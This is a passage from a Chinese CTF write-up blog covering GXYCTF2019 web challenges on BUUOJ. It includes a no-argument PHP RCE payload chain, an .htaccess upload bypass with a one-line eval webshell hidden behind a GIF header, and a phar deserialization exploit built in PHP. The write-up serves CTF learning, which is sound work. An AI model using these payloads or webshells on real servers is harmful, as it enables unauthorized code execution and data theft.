+<p>这题是无参RCE，无参RCE的意思是只允许执行a(), a(b())这样的函数，而不允许带参数，比如a(“b”)是禁止的.<br>想读flag，那也带先知道文件名和文件路径噻，怎么读呢，用<code>scandir()</code>函数可以列出目录下文件，如<code>&lt;?php print_r(scandir(&#39;.&#39;))?&gt;</code><br><img src="https://img-blog.csdnimg.cn/20200912212854576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>但是我们函数里面有个<code>‘.’</code>，怎么搞? <code>localeconv() </code>函数返回一包含本地数字及货币格式信息的数组，有点看不懂，试一试，注意第一个参数，是个点！再加上<code>current（）</code>函数(或者poc())，此函数返回数组中的当前元素的值，默认是第一个鸭，因为数组指针没动</p>
+<blockquote>
+<p>相关函数：<br>end() - 将内部指针指向数组中的最后一个元素，并输出。<br>next() - 将内部指针指向数组中的下一个元素，并输出。<br>prev() - 将内部指针指向数组中的上一个元素，并输出。<br>reset() - 将内部指针指向数组中的第一个元素，并输出。<br>each() - 返回当前元素的键名和键值，并将内部指针向前移动。</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20200912213802160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200913114407999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这样就可以读取题目下都有啥文件啦，其实字典已经扫出来flag.php了，然后就是怎么读取的问题了<br><img src="https://img-blog.csdnimg.cn/20200913115323573.png#pic_center" alt="在这里插入图片描述"><br>上面介绍current()函数的时候介绍的相关函数就有用啦，但是用next()的话是第二个，用end()是最后一个，读不到倒数第二个的值，这时候就需要<code>array_reverse()</code>函数了，这是可以以相反的顺序返回数组，然后再用<code>next()</code>函数读取第二个值，试一试，读出来了<br><img src="https://img-blog.csdnimg.cn/20200913131423592.png#pic_center" alt="在这里插入图片描述"><br>怎么读内容呢？看源码发现<code>et</code>被ban掉了，那<code>ile_get_contents()</code>就用不了了，<br>不过可以用<code>readfile()</code>、<code>show_source()</code>、<code>highlight_file()</code>这三个函数替代，所以最终的payload就是<br><code>?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</code><br><img src="https://img-blog.csdnimg.cn/20200913223422570.png#pic_center" alt="在这里插入图片描述"></p>
+<ul>
+<li><strong>骚姿势</strong><br>sky师傅的一种思路<br>php默认是不主动使用session的，但是我们可以用通过<code>session_start()</code>告诉PHP使用session，session_id()可以获取到当前的session id，再手动设置cookie，如下，然后再读取内容就好了<br><img src="https://img-blog.csdnimg.cn/20200913231557487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200913231945391.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
+</ul>
+<hr>
+<h1 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h1><blockquote>
+<p>知识点：.htaccess的妙用</p>
+</blockquote>
+<p>先上传一个小马看看，==ph== 后缀的都被ban了。。。<br><img src="https://img-blog.csdnimg.cn/20200916142612185.png#pic_center" alt="在这里插入图片描述"><br>图片马试一试，凉凉，看看是什么服务，搞一个不存在的页面让它404<br><img src="https://img-blog.csdnimg.cn/20200916142737953.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200916143102378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>apache的，那就用 ==.htaccess==让apache将所有上传的文件都当成php来执行，代码如下，上传记得用bp改文件类型</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application&#x2F;x-httpd-php</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>何为.htaccess？<br>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20200916143512494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后在传一个图片马就行，额一句话的🐎不行，应该是过滤了<code>&lt;?</code>，那就用js引用，代码如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="built_in">eval</span>($_POST[<span class="string">&#x27;xxx&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200916143631619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200916144038324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200916144147992.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<ul>
+<li><p>AntSword连一下就好<br><img src="https://img-blog.csdnimg.cn/20200916144249764.png#pic_center" alt="在这里插入图片描述"></p>
+</li>
+<li><p>不想用AntSword可以post<code>xxx=system(&#39;cat /flag&#39;)</code>，不过函数被ban了，但是还能用上题用的<code>show_source()</code><br><img src="https://img-blog.csdnimg.cn/20200916144556253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200916144803665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200916144920251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+</li>
+</ul>
+<hr>
+<h1 id="StrongestMind"><a href="#StrongestMind" class="headerlink" title="StrongestMind"></a>StrongestMind</h1><blockquote>
+<p>知识点：脚本练习，python，re</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20200916145929588.png#pic_center" alt="在这里插入图片描述"><br>还真是莫的感情啊，python脚本计算<br><a target="_blank" rel="noopener" href="https://www.runoob.com/python/python-reg-expressions.html">re教程</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://795c13f3-e110-4612-a26d-92f4d73b5398.node3.buuoj.cn&quot;</span></span><br><span class="line">s = requests.session()</span><br><span class="line">exp = re.compile(<span class="string">r&#x27;[0-9]+ [+|-] [0-9]+&#x27;</span>)</span><br><span class="line"></span><br><span class="line">res = s.get(url)</span><br><span class="line">res.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;answer&quot;</span>:eval(exp.findall(res.text)[<span class="number">0</span>])&#125;//eval() 函数用来执行一个字符串表达式，并返回表达式的值。</span><br><span class="line">res = s.post(url,data=data)</span><br><span class="line">time.sleep(<span class="number">0.06</span>)//靶机限制，延时</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    answer = eval(exp.findall(res.text)[<span class="number">0</span>])</span><br><span class="line">    data = &#123;<span class="string">&quot;answer&quot;</span>:answer&#125;</span><br><span class="line">    res = s.post(url,data)</span><br><span class="line">    res.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">    print(<span class="string">&#x27;&#123;0&#125;次提交：&#123;1&#125;&#x27;</span>.format(i,answer))</span><br><span class="line">    time.sleep(<span class="number">0.06</span>)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20200916154646548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<hr>
+<h1 id="BabysqliV3-0"><a href="#BabysqliV3-0" class="headerlink" title="BabysqliV3.0"></a>BabysqliV3.0</h1><blockquote>
+<p>知识点：弱口令，LFI，phar反序列化<br>官方WP：<a target="_blank" rel="noopener" href="https://gksec.com/GXY_CTF_WriteUp.html">https://gksec.com/GXY_CTF_WriteUp.html</a></p>
+</blockquote>
+<p>题目是sql，开始页面也是登录框，看源码有个u9db8，搜了一下也没看懂， 开始注入，各种方法都没用，看了看wp发现这根本不是sql。。。是个爆破界面，和上面那个注入一样，用户名是admin，爆破密码，注意设置线程，赵总靶机有访问限制，出密码了，登上看看<br><img src="https://img-blog.csdnimg.cn/20200916195944398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200916200133402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>登上是个上传，但是URL感觉会有LFI，搞一下搞一下<br><img src="https://img-blog.csdnimg.cn/20200916200702578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">	上传文件</span><br><span class="line">	&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">	&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $Filename;</span><br><span class="line">	<span class="keyword">public</span> $cmd;</span><br><span class="line">	<span class="keyword">public</span> $token;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		$sandbox = getcwd().<span class="string">&quot;/uploads/&quot;</span>.md5($_SESSION[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">		$ext = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">		@mkdir($sandbox, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, $_GET[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">&#x27;user&#x27;</span>].$ext;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params">$file</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>($file[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big (′▽`〃)&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.$file[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line">		<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">	$uploader = <span class="keyword">new</span> Uploader();</span><br><span class="line">	$uploader-&gt;upload($_FILES[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;下面是你上传的文件：&lt;br&gt;&quot;</span>.$uploader.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>file_get_contents($uploader)</code>这行代码可以把我们上传的文件读出来，所以我们只需要将 ==$this-&gt;Filename== 等于flag.php就可以读出来flag（提一下，不晓得为啥只出来这一次，我在上传读取就变成了flag.php+文件内容，还望各位师傅指点迷津）<br> <img src="https://img-blog.csdnimg.cn/20200921161839314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
+<li>官方做法：<br> 扫了一下，存在flag.php，访问一下被ban了<br> <img src="https://img-blog.csdnimg.cn/20200921174822895.png#pic_center" alt="在这里插入图片描述"><br>看upload源码发现析构函数里面有==eval== 函数，要想利用这个函数就需要<code>$this-&gt;token != $_SESSION[&#39;user&#39;]</code>，在构造函数里面可以看到正确上传文件后，文件名就是==SESSION== ，上传一个看看吧<br><img src="https://img-blog.csdnimg.cn/2020092117591464.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200921180312695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200921180450793.png#pic_center" alt="在这里插入图片描述"><br>但是，怎么利用呢？并没有cmd参数可以上传，所以，我也不晓得哈哈哈。<br>官方说的是用反序列化，但是本题并没有 <code>unserialize() </code><blockquote>
+<p>怎么反序列化？<br>引用官方：PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，既然是打包文件，就肯定 会对相应的class进行序列化存储，再在执行某些函数或者需要调用数据的时候自动反序列化，很 多函数都可以自动反序列化phar文件，常见的莫过于 file_get_contents() 和 file_put_contents() ，具体哪些函数受影响请参考 <a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">seaii 师傅的博客</a><br>\</p>
+<ul>
+<li>此外，phar还有一个特点，无需特定的文件后缀，即使使用txt格式的后缀只要文件内容是phar的 格式即可被php识别为phar文件，可以利用这个feature上传txt文件构造反序列化</li>
+<li>现在只要构造一个phar反序列化文件，将命令替换为getﬂag操作，再把 检查的token替换为服务器分发的，后控制文件名进行反序列化操作，达到任意命令执行的目 的</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+<p>在本地生成一个phar文件，注意：创建phar文件需要先将==php.ini== 中的==Phar.readonly== 设置为off，并去掉注释符号<br><img src="https://img-blog.csdnimg.cn/20200921191259160.png#pic_center" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $Filename;</span><br><span class="line">		<span class="keyword">public</span> $cmd;</span><br><span class="line">		<span class="keyword">public</span> $token;</span><br><span class="line">	&#125;</span><br><span class="line">	$o = <span class="keyword">new</span> Uploader();</span><br><span class="line">	$o-&gt;cmd = <span class="string">&#x27;show_source(&quot;./flag.php&quot;);&#x27;</span>;</span><br><span class="line">	$o-&gt;Filename = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">	$o-&gt;token = <span class="string">&#x27;GXY2deee2b530c9eab1ca630b4bb846d949&#x27;</span>;</span><br><span class="line">	<span class="keyword">echo</span>(serialize($o));</span><br><span class="line"></span><br><span class="line">	$exp = <span class="keyword">new</span> Phar(<span class="string">&quot;exp.phar&quot;</span>);</span><br><span class="line">	$exp-&gt;startBuffering();</span><br><span class="line">	$exp-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __halt_compiler();?&gt;&quot;</span>);<span class="comment">//设置stub，并增加gif头</span></span><br><span class="line">	$exp-&gt;setMetadata($o);<span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">	$exp-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">	$exp-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>将生成的phar文件上传得到路径，将此路径作为==name== 参数，并带上<code>phar://</code>，这样 ==$this-&gt;Filename== 就被指定为phar，触发phar反序列化，导致命令执行<br><img src="https://img-blog.csdnimg.cn/20200921193511987.png#pic_center" alt="在这里插入图片描述"><br>最后payload<br><code>http://e056dfaa-4f83-4709-9d5b-8fcf86ecd67f.node3.buuoj.cn/upload.php?name=phar:///var/www/html/uploads/8d9d1997da800fb74165a46e7f667312/GXY2deee2b530c9eab1ca630b4bb846d949.txt</code><br>再随意上传一个文件即可看到flag，额可惜复现失败，我也不晓得咋回事<br><img src="https://img-blog.csdnimg.cn/2020092119551646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/490.htm">Y1ng师傅</a>的getshell<br>upload的源码里面的正则，因为出题人为了代码美观，再<code>.</code>前面多了一个空格，所以正则匹配变成了匹配<code>%20.</code>，也就是没匹配。。。<br><img src="https://img-blog.csdnimg.cn/20200921195749702.png#pic_center" alt="在这里插入图片描述"><br>这个可以自行尝试，Y1ng师傅讲的也很清楚，不再赘述</li>
+</ul>
+<hr>
+<h1 id="END"><a href="#END" class="headerlink" title="END"></a>END</h1><p>对于我这个菜鸡，这次的全家桶让我学到不少东西，继续淦</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="yq1ng 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="yq1ng 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>yq1ng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2020/K4H6SZ/" title="BUUOJ-[GXYCTF2019]-WEB-WP">http://example.com/2020/K4H6SZ/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF-WEB/" rel="tag"><i class="fa fa-tag"></i> CTF WEB</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/197BKC8/" rel="prev" title="2017-赛客夏令营-Web全家桶">
+      <i class="fa fa-chevron-left"></i> 2017-赛客夏令营-Web全家桶
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/1Q4RCR8/" rel="next" title="buuoj [网鼎杯 2020 青龙组] （持续更新）">
+      buuoj [网鼎杯 2020 青龙组] （持续更新） <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
